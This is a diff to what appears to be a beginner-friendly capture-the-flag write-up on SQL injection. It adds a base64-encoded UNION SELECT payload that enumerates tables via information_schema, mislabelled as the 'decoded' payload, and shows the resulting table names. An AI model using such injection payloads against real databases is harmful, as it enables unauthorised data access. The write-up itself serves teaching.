@@ -170,7 +170,12 @@ Plain-text payload:
 ```sql
 1' UNION SELECT group_concat(table_name)
 FROM information_schema.tables
-WHERE table_schema='critter_gallery'#
+WHERE table_schema='critter_gallery'#   
+```
+Base64 Decoded payload:
+
+```
+MScgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKQpGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMKV0hFUkUgdGFibGVfc2NoZW1hPSdjcml0dGVyX2dhbGxlcnknIyAgIA==
 ```
 
 **What's `information_schema`?** Think of it as the database's own filing cabinet that lists every drawer (table) that exists inside it — asking it nicely (or trickily) tells you what's there.
@@ -183,7 +188,8 @@ animals,secret_vault
 
 Two tables existed: `animals` (probably just normal pictures) and `secret_vault` — which sounded very interesting. 👀
 
-**📸 [Insert screenshot here: encoded payload for table enumeration and response showing `animals,secret_vault`]**
+**📸 [Encoded payload for table enumeration and response showing `animals,secret_vault`]**
+![Encoded payload for table enumeration](image_file/9.jpg)
 
 ---
 
